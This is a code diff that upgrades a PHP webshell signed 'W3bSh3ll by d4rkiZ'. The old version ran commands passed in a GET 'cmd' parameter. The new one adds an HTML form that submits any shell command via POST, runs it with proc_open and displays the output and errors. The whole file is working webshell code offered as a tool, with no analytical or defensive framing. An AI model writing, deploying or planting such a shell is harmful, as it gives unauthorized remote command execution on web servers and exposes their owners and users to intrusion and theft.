@@ -1,5 +1,5 @@
 <?php
-// Create a simple PHP webshell
+// Create an interactive and user-friendly PHP webshell
 
 // Define a custom function to execute commands
 function execute_command($cmd) {
@@ -13,7 +13,7 @@ function execute_command($cmd) {
     $process = proc_open($cmd, $descriptors, $pipes);
 
     if (is_resource($process)) {
-        // Read the output
+        // Read the output and errors
         $output = stream_get_contents($pipes[1]);
         $errors = stream_get_contents($pipes[2]);
 
@@ -25,19 +25,37 @@ function execute_command($cmd) {
         // Close the process
         proc_close($process);
 
-        // Output the result
-        echo "Output:\n";
-        echo $output;
+        // Prepare the output for HTML display
+        $output = htmlspecialchars($output, ENT_QUOTES, 'UTF-8');
+        $errors = htmlspecialchars($errors, ENT_QUOTES, 'UTF-8');
 
-        echo "Errors:\n";
-        echo $errors;
+        // Output the result in a user-friendly manner
+        echo '<pre>';
+        echo '<strong>Command:</strong> ' . $cmd . "\n\n";
+        echo '<strong>Output:</strong>' . "\n" . $output . "\n";
+        echo '<strong>Errors:</strong>' . "\n" . $errors . "\n";
+        echo '</pre>';
     }
 }
 
-// Check if a command parameter is provided
-if (isset($_GET['cmd'])) {
-    // Get the command from the URL parameter and execute it
-    $command = $_GET['cmd'];
+// Check if a command is submitted
+if (isset($_POST['command'])) {
+    // Get the command from the form submission and execute it
+    $command = $_POST['command'];
     execute_command($command);
 }
 ?>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>W3bSh3ll by d4rkiZ</title>
+</head>
+<body>
+    <h1>W3bSh3ll by d4rkiZ</h1>
+    <form method="POST" action="">
+        <input type="text" name="command" placeholder="Enter your command">
+        <button type="submit">Send</button>
+    </form>
+</body>
+</html>
